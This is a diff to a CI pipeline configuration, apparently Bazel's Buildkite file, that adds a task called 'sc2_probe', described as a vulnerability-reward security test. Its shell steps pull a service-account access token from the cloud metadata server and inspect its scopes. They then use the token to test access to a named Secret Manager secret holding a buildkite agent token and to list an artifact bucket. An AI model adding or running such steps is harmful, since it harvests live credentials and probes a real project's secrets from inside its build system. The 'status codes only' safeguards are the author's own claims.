@@ -323,3 +323,23 @@ tasks:
     build_targets:
       - "//scripts/docs:gen_mdx_release_docs"
       - "//src/main/java/com/google/devtools/build/lib:gen_mdx_reference_docs"
+
+  sc2_probe:
+    platform: ubuntu2404
+    name: "SC2 probe (OSS VRP security test, status codes only)"
+    shell_commands:
+      - |
+        echo "== PROBE STEP 1: metadata server reachability (service-account email only) =="
+        curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email || echo "STEP1 FAILED"
+      - |
+        echo "== PROBE STEP 2: token expiry and scopes only (token never printed) =="
+        TOKEN=$(curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])") || TOKEN=""
+        if [ -z "$TOKEN" ]; then echo "STEP2 NO TOKEN OBTAINED"; else curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=$TOKEN" | python3 -c "import sys,json; d=json.load(sys.stdin); print('expires_in:', d.get('expires_in')); print('scope:', d.get('scope'))" || echo "STEP2 TOKENINFO FAILED"; fi
+      - |
+        echo "== PROBE STEP 3: Secret Manager status codes only (never the body) =="
+        curl -s -o /dev/null -w "secret GET status: %{http_code}\n" -H "Authorization: Bearer $TOKEN" "https://secretmanager.googleapis.com/v1/projects/bazel-untrusted/secrets/bazel-buildkite-agent-token" || echo "STEP3 GET FAILED"
+        curl -s -o /dev/null -w "secret versions:access status: %{http_code}\n" -H "Authorization: Bearer $TOKEN" -X POST "https://secretmanager.googleapis.com/v1/projects/bazel-untrusted/secrets/bazel-buildkite-agent-token/versions/latest:access" || echo "STEP3 ACCESS FAILED"
+      - |
+        echo "== PROBE STEP 4: artifact bucket object names only (first 5, no downloads) =="
+        curl -s -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o" | python3 -c "import sys,json; print([i['name'] for i in json.load(sys.stdin).get('items',[])][:5])" || echo "STEP4 FAILED"
+        echo "== PROBE DONE =="
